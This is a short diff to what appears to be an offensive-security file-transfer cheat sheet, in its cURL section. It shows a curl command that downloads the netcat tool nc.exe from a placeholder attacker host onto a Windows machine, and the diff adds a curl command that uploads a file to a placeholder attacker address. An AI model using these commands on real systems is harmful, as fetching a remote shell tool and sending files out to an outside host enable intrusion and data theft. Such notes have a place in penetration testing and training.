@@ -11,3 +11,4 @@
 ### 3) cURL
 
     curl -o C:\Users\USER\Downloads.nc.exe http://ATK_IP/nc.exe
+    curl --upload-file test.txt http://ATTACK_IP:PORT/
